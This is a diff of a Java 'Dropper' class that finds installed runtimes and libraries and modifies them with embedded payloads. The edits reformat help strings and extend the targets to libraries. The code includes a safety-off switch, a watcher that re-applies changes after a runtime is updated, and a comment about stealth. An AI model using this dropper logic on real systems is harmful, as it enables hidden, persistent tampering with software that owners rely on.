@@ -70,16 +70,12 @@ public class Dropper {
 	
 	private static final String SAFETY_OFF_LONG_ARGUMENT = "--safety-off";
 	private static final String SAFETY_OFF_SHORT_ARGUMENT = "-so";
-	private static final String SAFETY_OFF_DESCRIPTION = "        This flag must be specified to execute the modifications\n"
-			                                           + "                         specified by embedded payloads (enabling the flag disables\n"
-			                                           + "                         the built-in safety).";
+	private static final String SAFETY_OFF_DESCRIPTION = "        This flag must be specified to execute the modifications specified by embedded payloads (enabling the flag disables the built-in safety).";
 	private static boolean safetyOff = false;
 	
 	private static final String OUTPUT_DIRECTORY_LONG_ARGUMENT = "--output-directory";
 	private static final String OUTPUT_DIRECTORY_SHORT_ARGUMENT = "-o";
-	private static final String OUTPUT_DIRECTORY_DESCRIPTION = "   Specifies the output directory to save modified runtimes,\n" 
-															 + "                         if not specified output files will be written as temporary\n"
-															 + "                         files.";
+	private static final String OUTPUT_DIRECTORY_DESCRIPTION = "   Specifies the output directory to save modified runtimes, if not specified output files will be written as temporary files.";
 	private static File outputDirectory = null;
 
 	private static final String PRINT_TARGETS_LONG_ARGUMENT = "--print-targets";
@@ -94,23 +90,17 @@ public class Dropper {
 	
 	private static final String SEARCH_DIRECTORIES_LONG_ARGUMENT = "--search-directories";
 	private static final String SEARCH_DIRECTORIES_SHORT_ARGUMENT = "-s";
-	private static final String SEARCH_DIRECTORIES_DESCRIPTION = " Specifies a comma separated list of directory paths to\n"
-																+ "                         search for runtimes, if not specified a default set of\n"
-																+ "                         search directories will be used.";
+	private static final String SEARCH_DIRECTORIES_DESCRIPTION = " Specifies a comma separated list of directory paths to search for runtimes, if not specified a default set of search directories will be used.";
 	
 	private static final long WATCHER_SLEEP_TIME = (long) (1000 * 60); // 1 minute
 	private static final String WATCHER_SLEEP_TIME_LONG_ARGUMENT = "--watcher-sleep";
 	private static final String WATCHER_SLEEP_TIME_SHORT_ARGUMENT = "-ws";
-	private static final String WATCHER_SLEEP_TIME_DESCRIPTION = "     The amount of time in milliseconds to sleep between watcher\n"
-															   + "                         checks.";
+	private static final String WATCHER_SLEEP_TIME_DESCRIPTION = "     The amount of time in milliseconds to sleep between watcher checks.";
 	
 	private static boolean watcher = false;
 	private static final String WATCHER_LONG_ARGUMENT = "--watcher";
 	private static final String WATCHER_SHORT_ARGUMENT = "-w";
-	private static final String WATCHER_DESCRIPTION = "            Enables a watcher process that waits to modify any\n"
-																+ "                         discovered runtimes until the file hash of the runtime has\n"
-																+ "                         changed (by default the process sleeps for 1 minute, unless\n"
-																+ "                         the " + WATCHER_SLEEP_TIME_LONG_ARGUMENT + " argument is specified.";
+	private static final String WATCHER_DESCRIPTION = "            Enables a watcher process that waits to modify any discovered runtimes until the file hash of the runtime has changed (by default the process sleeps for 1 minute, unless the " + WATCHER_SLEEP_TIME_LONG_ARGUMENT + " argument is specified.";
 	
 	private static final String DEBUG_LONG_ARGUMENT = "--debug";
 	private static final String DEBUG_SHORT_ARGUMENT = "-d";
@@ -253,8 +243,7 @@ public class Dropper {
 		if(debug) System.out.println(configuration);
 		
 		// modify runtimes
-		LinkedList<File> runtimes = new LinkedList<File>();
-		for(File runtime : !runtimes.isEmpty() ? runtimes : getRuntimes(searchPaths, configuration)){
+		for(File runtime : getTargets(searchPaths, configuration)){
 			if(debug){
 				System.out.println("Discovered runtime: " + runtime.getAbsolutePath());
 			}
@@ -286,8 +275,10 @@ public class Dropper {
 								System.err.println("Unabled to hash " + runtime.getAbsolutePath() + ", sleeping for an iteration...");
 								e.printStackTrace();
 							} catch (InterruptedException e) {
-								System.err.println("Unabled to sleep thread.");
-								e.printStackTrace();
+								if(debug){
+									System.err.println("Unabled to sleep thread.");
+									e.printStackTrace();
+								}
 							}
 						}
 					}).start();
@@ -330,9 +321,11 @@ public class Dropper {
 		return bos.toByteArray();
 	}
 	
-	private static LinkedList<File> getRuntimes(String[] searchPaths, Configuration configuration){
-		HashSet<String> runtimeNames = new HashSet<String>(configuration.runtimes);
-		LinkedList<File> runtimes = new LinkedList<File>();
+	private static LinkedList<File> getTargets(String[] searchPaths, Configuration configuration){
+		HashSet<String> targetNames = new HashSet<String>();
+		targetNames.addAll(configuration.runtimes);
+		targetNames.addAll(configuration.libraries);
+		LinkedList<File> targets = new LinkedList<File>();
 		
 		// establish a set of directories to search for runtimes
 		LinkedList<File> searchDirectories = new LinkedList<File>();
@@ -359,7 +352,7 @@ public class Dropper {
 		
 		// search each directory for runtimes
 		for(File searchDirectory : searchDirectories){
-			runtimes.addAll(search(searchDirectory, runtimeNames));
+			targets.addAll(search(searchDirectory, targetNames));
 		}
 
 		// Note: removed this functionality, as it is way to expensive...not very stealthy
@@ -370,7 +363,7 @@ public class Dropper {
 //			}	
 //		}
 
-		return runtimes;
+		return targets;
 	}
 	
 	private static LinkedList<File> search(File directory, HashSet<String> fileNames){
